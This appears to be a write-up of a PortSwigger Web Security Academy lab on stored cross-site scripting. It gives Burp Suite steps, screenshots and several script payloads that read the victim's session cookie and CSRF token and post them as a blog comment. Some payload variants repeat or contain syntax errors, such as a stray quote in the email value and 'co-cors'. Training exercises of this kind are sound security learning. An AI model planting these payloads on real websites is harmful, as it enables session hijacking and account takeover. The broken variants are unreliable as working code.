
<h1 align="center"> Lab: Exploiting cross-site scripting to steal cookies </h1>

<img width="774" height="479" alt="image" src="https://github.com/user-attachments/assets/027970ba-4385-47ab-938d-83dae7424016" />

## Lab URL: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies

## Lab Solution: 
This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim. 

**Note**
> To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

> Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the cookie.




# Start Lab:

<img width="781" height="692" alt="image" src="https://github.com/user-attachments/assets/ad6990e5-a8d2-4ab4-99d4-688d36e5605a" />

- Access the lab:
<img width="799" height="835" alt="image" src="https://github.com/user-attachments/assets/07dde991-3127-4be2-af39-4934e1f442ae" />


- First in this open our `Burp Suite` -> open `Burp Browser`:
<img width="1918" height="852" alt="image" src="https://github.com/user-attachments/assets/e50a28e4-5a4e-4527-ab08-bbaff1253a2c" />

- After Past target URL into `Burp Browser`:
<img width="1919" height="1054" alt="image" src="https://github.com/user-attachments/assets/27eca8d2-1004-43d9-b551-fc27909f7e0f" />


- Click on `View Post`:
<img width="815" height="827" alt="image" src="https://github.com/user-attachments/assets/9faf38d4-7830-4cc5-affb-8847303c4eb0" />


<img width="975" height="528" alt="image" src="https://github.com/user-attachments/assets/5cca29a2-8d2b-48ab-acc5-7f0c6c5511af" />

- In this we can note that our post ID:
````
postID = 4
````

- After scroll down -> `Right-Click` -> select `Inspect`:
<img width="715" height="946" alt="image" src="https://github.com/user-attachments/assets/158a7e96-2420-4298-8445-c6c98e78d680" />

- And then input some inject on Command:
````
<SCRIPT>alert()</SCRIPT> 
````
<img width="1917" height="956" alt="image" src="https://github.com/user-attachments/assets/5333330b-3f80-4e2e-9748-4a95f3fdf26a" />

- After back to our `Burp`:
<img width="1900" height="981" alt="image" src="https://github.com/user-attachments/assets/ee2431a6-9eb8-412b-b15a-66709ab0a22e" />

- Now we see what command that we `Post`.

- After send it to Repeater -> `Right-Click` -> `Send to Repeater`:
<img width="1907" height="1013" alt="image" src="https://github.com/user-attachments/assets/d1f3cf6b-3124-48c5-9259-0d020162f50e" />

Select on it after delete it:
<img width="1465" height="850" alt="image" src="https://github.com/user-attachments/assets/9d5c1f82-0e95-41d1-a172-1d482161a577" />

<img width="1467" height="735" alt="image" src="https://github.com/user-attachments/assets/2b346548-a846-4637-9aba-0532692add7c" />

- And we see this.

- After go back to our Browser:
<img width="1912" height="952" alt="image" src="https://github.com/user-attachments/assets/8f1b26cb-6a14-45b0-9fd0-a2ce0f2be7f0" />

- Now we see alert, but it not mean we solved this lab, in this it just alert:
<img width="1919" height="906" alt="image" src="https://github.com/user-attachments/assets/13a920ad-7d71-481d-b23b-ac89676a7583" />

- Now we see what command that we was input:
<img width="702" height="966" alt="image" src="https://github.com/user-attachments/assets/3ffa6ce3-1d64-4bf1-8188-d981670ae5e4" />

<img width="1911" height="1078" alt="image" src="https://github.com/user-attachments/assets/70969eea-acf0-4be0-a724-a1a059bafb08" />

- Now we it alert again:
<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/c3fd7766-a6fd-4a7a-9b14-f5d80bb10fbf" />

- After view on `Developer Tools`, press `Ctrl + shift + I` on `FireFox` (Recommend) -> go to `Storage`:
<img width="1922" height="614" alt="image" src="https://github.com/user-attachments/assets/8f584ea4-42de-4590-b2fc-4589e8957875" />

- Now we we see the `Session Cookie`.

- After back to our `Inspector`, in this if we want to what we input first just click `Mouse point` -> and click on `Comment Box`: 
<img width="1921" height="1026" alt="image" src="https://github.com/user-attachments/assets/c44a8df6-988e-4dc4-902d-2169c3798d32" />

- Now we see like what that we was input on `Burp Suite`
<img width="1912" height="932" alt="image" src="https://github.com/user-attachments/assets/7cc94131-6c28-4021-9bfa-7448a7ff247d" />


- After go to `Console`:
````
document.getElementsByTagName('input')[0] 
````
<img width="1922" height="482" alt="image" src="https://github.com/user-attachments/assets/e3d3306e-dc9e-43ac-940d-98766a0083bc" />

- Now we see `<input required="" type="hidden" name="csrf" value="4cLs3hCjsXRbSVoeyp2GsUtmXtpCAKDQ">`.

````
document.getElementsByTagName('input')[0].getAttribute('value')
````
<img width="1921" height="353" alt="image" src="https://github.com/user-attachments/assets/bd4bb498-8399-4761-8700-e45bd75bfc5b" />


- Or we can use:
````
document.cookie
````
<img width="1327" height="241" alt="image" src="https://github.com/user-attachments/assets/9fa79b5a-966e-4a9a-87a0-1a44f3ae0487" />



- Now we can craft script:
````
<script>
window.onload = function(){
    var post_data = "csrf="+document.getElementsByTagName('input')[0].getAttribute('value')
        +"&postId=4&comment="+document.cookie+"&name=k4n0ng&email=k4n0ng@gmail.hack&website=https://www.google.com";
    fetch("https://0a8000da03e995c880b0a8aa007d0027.web-security-academy.net/post/comment", {
        method: 'POST',
        mode: 'no-cors',
        body: post_data
    });
};
</script>
````
<img width="1039" height="957" alt="image" src="https://github.com/user-attachments/assets/cfdc643b-65b9-47bb-997a-3869a9f7ec11" />

<img width="984" height="368" alt="image" src="https://github.com/user-attachments/assets/a5a0a52d-2c62-4dae-a286-7794ae364e67" />


#### What the vulnerable this scrip:
- `window.onload = function(){`: Runs the script as soon as the webpage loads.
- `var post_data = ...`: Builds a string of data to send via POST. It includes: <br> - CSRF token (from first `<input>` element) <br> - Hardcoded comment (`document.cookie`) â†’ steals cookies! <br> - Fake name, email, website
- `fetch(...)`: Sends the data to a remote server using HTTP POST.

#### Malicious Intent
This script is designed to steal browser cookies and send them to an attacker-controlled server:
- `document.cookie`:  exfiltrates session cookies (could allow account takeover)
- `csrf=...`: tries to bypass CSRF protection by stealing the token
> This is a classic Cross-Site Scripting (XSS) payload used to steal session cookies from victims who visit the compromised page.


<img width="1897" height="1078" alt="image" src="https://github.com/user-attachments/assets/48588f87-2d75-4808-81f5-db434322c346" />

- After click on `Post Comment`:
<img width="1472" height="468" alt="image" src="https://github.com/user-attachments/assets/c7470583-66f5-453f-8f42-df47d875165e" />

<img width="1919" height="673" alt="image" src="https://github.com/user-attachments/assets/94ad1171-b3a5-41a1-9903-c47ec0fd3057" />

<img width="1919" height="1075" alt="image" src="https://github.com/user-attachments/assets/782ba259-0790-4253-a7cf-ba2f7cd87788" />

- But in this I don't see alert.



<script>
window.onload = function(){
    var post_data = "csrf="+document.getElementsByTagName('input')[0].getAttribute('value')
        +"&postId=4&comment="+document.cookie+"&name=k4n0ng&email=k4n0ng"gmail.com&website=http://aa.bb.cc";
    fetch("https://0a4300fe03b286e0869c02c200750031.web-security-academy.net/post/comment", {
        method: 'POST',
        mode: 'no-cors',
        body: post_data
    });
};
</script>

<img width="948" height="948" alt="image" src="https://github.com/user-attachments/assets/9500eeef-f171-44cb-81b8-d950ba57996b" />





<script>
window.onload = function(){
var post_data = "csrf="+document.getElementsByTagName('input')[0].getAttribute('value') +"&postId=4&comment="+document.cookie+"&name=k4n0ng&email=k4n0ng@gmail.hack&website=https://www.google.com";
fetch("https://0a8000da03e995c880b0a8aa007d0027.web-security-academy.net/post/comment", {
method: 'POST',
mode: 'no-cors',
body: post_data
});
};
</script>


<img width="961" height="955" alt="image" src="https://github.com/user-attachments/assets/fd552e0c-9691-4aec-a6b2-45efef429528" />


<img width="958" height="308" alt="image" src="https://github.com/user-attachments/assets/62b24465-412b-45e3-95d5-5cd5fe615b2f" />


<script>
window.addEventListener('DOMContentLoaded', function(){
    var token = document.getElementsByName('csrf')[0].value;
    var data = new FormData();
    data.append('csrf', token);
    data.append('postId', 8);
    data.append('comment', document.cookie);
    data.append('name', 'victim');
    data.append('email', 'gentilsecurity@gentil.com');
    data.append('website', 'https://gentilsecurity.com');

    fetch('/post/comment', {
        method: 'POST',
        mode: 'co-cors',
        body: data
    });
});
</script>




window.onload = function(){
    var post_data = "csrf="+document.getElementsByTagName('input')[0].getAttribute('value')
        +"&postId=4&comment="+document.cookie+"&name=cybersecRadar&email=cyber@sec.radar&website=http://aa.bb.cc";
    fetch("https://0a8000da03e995c880b0a8aa007d0027.web-security-academy.net/post/comment", {
        method: 'POST',
        mode: 'no-cors',
        body: post_data
    });
};



window.addEventListener('DOMContentLoaded', function(){
    var token = document.getElementsByName('csrf')[0].value;
    var data = new FormData();
    data.append('csrf', token);
    data.append('postId', 8);
    data.append('comment', document.cookie);
    data.append('name', 'victim');
    data.append('email', 'gentilsecurity@gentil.com');
    data.append('website', 'https://gentilsecurity.com');

    fetch('/post/comment', {
        method: 'POST',
        mode: 'co-cors',
        body: data
    });
});


<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/76691df2-7200-42ab-9842-baac8f7c1ef7" />

<img width="1073" height="436" alt="image" src="https://github.com/user-attachments/assets/d28ad865-e15c-42f5-b293-a0f8a691f93d" />





